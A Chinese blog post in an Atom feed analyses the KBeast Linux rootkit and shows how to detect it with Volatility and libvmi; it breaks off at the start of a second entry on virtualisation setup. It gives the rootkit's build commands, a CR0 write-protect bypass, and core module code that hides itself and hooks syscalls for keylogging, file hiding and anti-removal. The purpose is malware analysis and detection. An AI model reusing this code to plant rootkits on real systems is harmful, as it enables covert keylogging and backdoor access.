&lt;h3 id=&quot;0X00-全文环境&quot;&gt;&lt;a href=&quot;#0X00-全文环境&quot; class=&quot;headerlink&quot; title=&quot;0X00 全文环境&quot;&gt;&lt;/a&gt;0X00 全文环境&lt;/h3&gt;&lt;p&gt;Host Ubuntu 12.04 + Guest Ubuntu 10.04/11.04 + Libvmi + Volatility&lt;/p&gt;
&lt;p&gt;其中Kbeast运行在Guest Ubuntu 10.04/11.04中，libvmi与volatility运行在Host Ubuntu12.04中。&lt;/p&gt;
&lt;h3 id=&quot;0X01-Kbeast-特性&quot;&gt;&lt;a href=&quot;#0X01-Kbeast-特性&quot; class=&quot;headerlink&quot; title=&quot;0X01 Kbeast 特性&quot;&gt;&lt;/a&gt;0X01 Kbeast 特性&lt;/h3&gt;&lt;p&gt;以下是Kbeast实现的功能：&lt;/p&gt;
&lt;p&gt;- 隐藏可加载模块（LKM)&lt;/p&gt;
&lt;p&gt;- 隐藏文件/目录&lt;/p&gt;
&lt;p&gt;- 隐藏进程（ps,pstree,top,lsof)&lt;/p&gt;
&lt;p&gt;- 隐藏套接字和网络连接(netstat,lsof)&lt;/p&gt;
&lt;p&gt;- 记录键盘操作捕获用户行为&lt;/p&gt;
&lt;p&gt;- 反杀死进程&lt;/p&gt;
&lt;p&gt;- 反移除文件&lt;/p&gt;
&lt;p&gt;- 反删除可加载模块&lt;/p&gt;
&lt;p&gt;- root提权后门&lt;/p&gt;
&lt;p&gt;- 远程绑定后门 &lt;/p&gt;
&lt;h3 id=&quot;0X02-系统调用劫持基础&quot;&gt;&lt;a href=&quot;#0X02-系统调用劫持基础&quot; class=&quot;headerlink&quot; title=&quot;0X02 系统调用劫持基础&quot;&gt;&lt;/a&gt;0X02 系统调用劫持基础&lt;/h3&gt;&lt;p&gt;上述的Kbeast特性都是通过系统调用劫持实现的。在kernel 2.6.*之前，系统调用表”sys_call_table”是可以直接导出引用的，如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;extern void *sys_call_table[];
sys_call_table[__NR_syscall] = pointer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而在kernel 2.6.* 之后禁用了这种特性，并且其所在页是写保护的。然而，系统调用表依然在内存中，如果知道其所在内存地址，依然可以通过指针访问。内核中的符号表System.map （一般在/boot/目录下)记录了所有的符号及其地址，当然也包括系统调用表”sys_call_table”.  以Ubuntu 10.04为例，执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;grep sys_call_table /boot/System.map-2.6.32-21-generic
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;显示的结果为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;c0592150 R sys_call_table
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;c0592150指的是线性地址，R说明此地址所在的页面Read-only。目前的CPU都会将CR0控制寄存器的第16位（wp-bit）置1,将页面开启保护模式，这时CPU处于”write-proteed”模式，否则处于”read/write”模式。CR0寄存器的位描述可参考&lt;a href=&quot;https://en.wikipedia.org/wiki/Control_register#CR0&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CR0&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;如果能将WP位置0，就可以访问内存页面,读写系统调用表了。 下面这行代码便可实现此功能：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;write_cr0 (read_cr0 () &amp;amp; (~ 0x10000));
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0X03-Kbeast-使用&quot;&gt;&lt;a href=&quot;#0X03-Kbeast-使用&quot; class=&quot;headerlink&quot; title=&quot;0X03 Kbeast 使用&quot;&gt;&lt;/a&gt;0X03 Kbeast 使用&lt;/h3&gt;&lt;p&gt;下载&lt;a href=&quot;https://packetstormsecurity.com/files/108286/KBeast-Kernel-Beast-Linux-Rootkit-2012.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kbeast&lt;/a&gt;. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar xzf ipsecs-kbeast-v1.tar.gz
cd kbeast-v1
./setup build 1  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;具体可参考/kbeast-v1/setup 文件，参数1表示默认为kernel 2.6.32。测试过ubuntu11.04 内核为2.6.38，setup出错，作者声称：&lt;br&gt;Be kind to note that the beast has been tested in, but not limited to, kernel 2.6.9,&lt;br&gt;2.6.16, 2.6.18, 2.6.32, 2.6.35 (i386 or x86_64)，理论上只要修改setup相关参数以及ipsecs-kbeast-vl.c文件中的系统调用表的地址即可适应其它版本内核，未测试。&lt;/p&gt;
&lt;p&gt;成功编译后，kbeast就会加载到内核空间，rootkit安装在/usr/&lt;em&gt;h4x&lt;/em&gt;路径下，生成/usr/&lt;em&gt;h4x&lt;/em&gt;/_h4x_bd进程，以及acctlog 记录文件， 路径以及文件名等参数可以在config.h文件中配置。当然在目标机器guest中无法找到相关文件，因为已经被隐藏了。下文会利用volatility检测到相关进程的路径。&lt;/p&gt;
&lt;h3 id=&quot;0X04-Kbeast-核心&quot;&gt;&lt;a href=&quot;#0X04-Kbeast-核心&quot; class=&quot;headerlink&quot; title=&quot;0X04 Kbeast 核心&quot;&gt;&lt;/a&gt;0X04 Kbeast 核心&lt;/h3&gt;&lt;p&gt;Kbeast以LKM的方式存在，以下是其核心代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*init module insmod*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//Uncomment to hide this module&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  list_del_init(&amp;amp;__this_module.&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; tcp_seq_afinfo *my_afinfo = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;//proc_net is disappeared in 2.6.32, use init_net.proc_net&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc_dir_entry *my_dir_entry = init_net.proc_net-&amp;gt;subdir;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  write_cr0 (read_cr0 () &amp;amp; (~ &lt;span class=&quot;number&quot;&gt;0x10000&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(_KEYLOG_)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_read=(void *)sys_call_table[__NR_read];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table[__NR_read]=h4x_read;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_write=(void *)sys_call_table[__NR_write];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table[__NR_write]=h4x_write;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; defined(__x86_64__)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_getdents=sys_call_table [__NR_getdents];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table [__NR_getdents]=h4x_getdents;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;elif&lt;/span&gt; defined(__i386__)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    o_getdents64=sys_call_table [__NR_getdents64];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys_call_table [__NR_getdents64]=h4x_getdents64;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;error&lt;/span&gt; Unsupported architecture&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_unlink = sys_call_table [__NR_unlink];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_unlink] = h4x_unlink;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_rmdir = sys_call_table [__NR_rmdir];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_rmdir] = h4x_rmdir;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_unlinkat = sys_call_table [__NR_unlinkat];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_unlinkat] = h4x_unlinkat;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_rename = sys_call_table [__NR_rename];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_rename] = h4x_rename;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_open = sys_call_table [__NR_open];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_open] = h4x_open;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_kill = sys_call_table [__NR_kill];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_kill] = h4x_kill;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  o_delete_module = sys_call_table [__NR_delete_module];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  sys_call_table [__NR_delete_module] = h4x_delete_module;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  write_cr0 (read_cr0 () | &lt;span class=&quot;number&quot;&gt;0x10000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(my_dir_entry-&amp;gt;name, &lt;span class=&quot;string&quot;&gt;&quot;tcp&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    my_dir_entry = my_dir_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry-&amp;gt;data))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//seq_show is disappeared in 2.6.32, use seq_ops.show&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    old_tcp4_seq_show = my_afinfo-&amp;gt;seq_ops.show;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    my_afinfo-&amp;gt;seq_ops.show = h4x_tcp4_seq_show;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先将模块隐藏，取消CR0写保护，找到系统调用表地址，将其处理函数换成自己的函数，分别对应其中的特性。 如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sys_call_table[__NR_read]=h4x_read; // log key
sys_call_table[__NR_write]=h4x_write; // fake output ps,pstree,top,lsof
sys_call_table [__NR_getdents]=h4x_getdents; //hide file and directory
sys_call_table [__NR_unlink] = h4x_unlink; //Don&amp;apos;t allow your file to be removed
sys_call_table [__NR_rmdir] = h4x_rmdir; //Don&amp;apos;t allow your directory to be removed
sys_call_table [__NR_unlinkat] = h4x_unlinkat; //Don&amp;apos;t allow your file and directory to be removed 
sys_call_table [__NR_rename] = h4x_rename; //Don&amp;apos;t allow your file to be renamed/moved
sys_call_table [__NR_open] = h4x_open; //Don&amp;apos;t allow your file to be overwrited
sys_call_table [__NR_kill] = h4x_kill; //Don&amp;apos;t allow your process to be killed
sys_call_table [__NR_delete_module] = h4x_delete_module;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0X05-Kbeast-Detection-Using-Libvmi-and-Volatility&quot;&gt;&lt;a href=&quot;#0X05-Kbeast-Detection-Using-Libvmi-and-Volatility&quot; class=&quot;headerlink&quot; title=&quot;0X05 Kbeast Detection Using Libvmi and Volatility&quot;&gt;&lt;/a&gt;0X05 Kbeast Detection Using Libvmi and Volatility&lt;/h3&gt;&lt;p&gt;检测之前，先按照 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/03/30/virt-setup-analysis/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇&lt;/a&gt; 文章搭好环境。&lt;/p&gt;
&lt;p&gt;以下是分别利用volatility的linux_psaux、linux_pslist、linux_pstree、linux_lsof、linux_proc_maps、linux_check_modules插件检测出来的结果，能检测出其隐藏的进程、模块、进程间的关系以及所在路径。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_psaux | grep _h4x_bd

Pid    Uid    Gid    Arguments 
2316   2      2      ./_h4x_bd

 python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslist | grep _h4x_bd 

 Offset     Name                 Pid             Uid             Gid    DTB      Start Time
 0xf579e680 _h4x_bd              2316            2               2      0x357c5000 2016-04-01 21:41:29 UTC+0000


  python vol.py -l vmi://1004desktop32         --profile=Linuxubuntu1004desktopx86 linux_pstree | grep _h4x_bd 

 Name                 Pid             Uid 
 ._h4x_bd             2316            2 

 python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslsof | grep _h4x_bd 

  Offset             Name                           Pid      FD       Path
  0x00000000f579e680 _h4x_bd                            2316        1 /dev/pts/0
0x00000000f579e680 _h4x_bd                            2316        2 /dev/pts/0
0x00000000f579e680 _h4x_bd                            2316        3 socket:[11708]

python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_proc_maps | grep _h4x_bd 


 linux_proc_maps


 Offset             Pid      Name                 Start              End         
       Flags       Pgoff Major  Minor  Inode      File Path




 0x00000000f579e680     2316 _h4x_bd                  0x0000000000adb000 0x0000000000adc000 ---      0x153000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
0x00000000f579e680     2316 _h4x_bd              0x0000000000adc000 0x0000000000ade000 r--      0x153000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
0x00000000f579e680     2316 _h4x_bd              0x0000000000ade000 0x0000000000adf000 rw-      0x155000    251      1     134375 /lib/tls/i686/cmov/libc-2.11.1.so
0x00000000f579e680     2316 _h4x_bd              0x0000000000adf000 0x0000000000ae2000 rw-           0x0      0      0          0 
0x00000000f579e680     2316 _h4x_bd              0x0000000008048000 0x0000000008049000 r-x           0x0    251      1     136169 /usr/_h4x_/_h4x_bd
0x00000000f579e680     2316 _h4x_bd              0x0000000008049000 0x000000000804a000 r--        0x1000    251      1     136169 /usr/_h4x_/_h4x_bd
0x00000000f579e680     2316 _h4x_bd              0x000000000804a000 0x000000000804b000 rw-        0x2000    251      1     136169 /usr/_h4x_/_h4x_bd
0x00000000f579e680     2316 _h4x_bd              0x00000000b7875000 0x00000000b7876000 rw-           0x0      0      0          0 
0x00000000f579e680     2316 _h4x_bd              0x00000000b7884000 0x00000000b7886000 rw-           0x0      0      0          0 
0x00000000f579e680     2316 _h4x_bd              0x00000000bfd84000 0x00000000bfd99000 rw-           0x0      0      0          0 [stack]

  python vol.py -l vmi://1004desktop32 --profile=Linuxubuntu1004desktopx86 linux_check_moudles | grep _h4x_bd   

 Module Address Module Name             
 0xf805dae0 ipsecs_kbeast_v1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; 当要清除module时，执行./setup clean. 但仍然会残留一些文件，无法删除。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Checking for make : /usr/bin/make
Removing Kernel Module
Removing Compiled Kernel Module
Stoping Network Daemon
Removing Backdoor File
rm: cannot remove `./_h4x_bd&amp;apos;: Permission denied
Removing Installation Directory
rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.o.cmd&amp;apos;:     Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.o&amp;apos;:         Permission denied
rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.ko.cmd&amp;apos;:     Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.ko&amp;apos;:         Permission denied
rm: cannot remove                     `/usr/_h4x_/.tmp_versions/ipsecs-kbeast-v1.mod&amp;apos;: Permission     denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.c&amp;apos;:         Permission denied
rm: cannot remove         `/usr/_h4x_/.ipsecs-kbeast-v1.mod.o.cmd&amp;apos;: Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.c&amp;apos;:         Permission denied
rm: cannot remove `/usr/_h4x_/bd-ipsecs-kbeast-v1.c&amp;apos;:     Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.o&amp;apos;:     Permission denied
rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.cc1&amp;apos;:     Permission denied 
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;如转载本文请注明出处: &lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/02/kbeast-analysis-detection/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/02/kbeast-analysis-detection/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/u/2767520802?is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0X00 全文环境&lt;/li&gt;
&lt;li&gt;0X01 Kbeast 特性&lt;/li&gt;
&lt;li&gt;0X02 系统调用劫持基础&lt;/li&gt;
&lt;li&gt;0X03 Kbeast 使用&lt;/li&gt;
&lt;li&gt;0X04 Kbeast 核心&lt;/li&gt;
&lt;li&gt;0X05 Kbeast Detection &lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
      <category term="Rootkit" scheme="http://yoursite.com/tags/Rootkit/"/>
    
      <category term="Malware" scheme="http://yoursite.com/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>A Comprehensive Virtualized Enviroment Setup and Analysis</title>
    <link href="http://yoursite.com/blog/2016/03/30/virt-setup-analysis/"/>
    <id>http://yoursite.com/blog/2016/03/30/virt-setup-analysis/</id>
    <published>2016-03-31T02:17:12.000Z</published>
    <updated>2016-05-19T13:17:49.000Z</updated>
    
    <content type="html">&lt;p&gt;本文介绍了一套完整的虚拟化环境搭建与分析工作，包括虚拟机的创建，虚拟机的管理，以及虚拟机的监控。可根据自身需要阅读相关内容。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0x00 全文环境 &lt;/li&gt;
&lt;li&gt;0x01 虚拟机创建KVM/QEMU &lt;/li&gt;
&lt;li&gt;0x02 虚拟机管理Libvirt&lt;/li&gt;
&lt;li&gt;0x03 虚拟机监控Libvmi&lt;/li&gt;
&lt;li&gt;0x04 虚拟机监控Volatility&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;0x00-全文环境&quot;&gt;&lt;a href=&quot;#0x00-全文环境&quot; class=&quot;headerlink&quot; title=&quot;0x00 全文环境&quot;&gt;&lt;/a&gt;0x00 全文环境&lt;/h3&gt;&lt;p&gt;Ubuntu12.04 + Kvm-kmod-3.8 + Qemu-kvm-1.1.2+ Libvirt 1.3.2 + Libvmi + Volatility &lt;/p&gt;
